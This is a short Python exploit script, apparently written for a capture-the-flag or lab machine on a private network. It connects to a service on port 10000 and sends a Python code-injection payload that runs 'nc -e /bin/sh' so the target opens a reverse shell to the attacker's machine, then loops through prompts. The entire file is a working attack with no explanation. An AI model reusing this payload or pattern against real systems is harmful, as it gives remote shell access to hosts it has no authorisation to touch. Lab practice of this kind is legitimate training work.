import socket

host = '10.10.144.207'
port = 10000

s = socket.socket()
s.connect((host,port))

while 1:
    
    s.send(b'__import__("os").system("nc -e /bin/sh 10.4.2.85 8888")\n') # change the tunnel IP

    data = s.recv(2048).decode('utf-8')
    print(data)

    data = s.recv(2048).decode('utf-8')
    print(data)

    s.send(b'1\n') # Send a proper interger value

    data = s.recv(2048).decode('utf-8')
    print(data)

    data = s.recv(2048).decode('utf-8')
    print(data)

    message = input('--- Press enter to continue ---')


s.close()
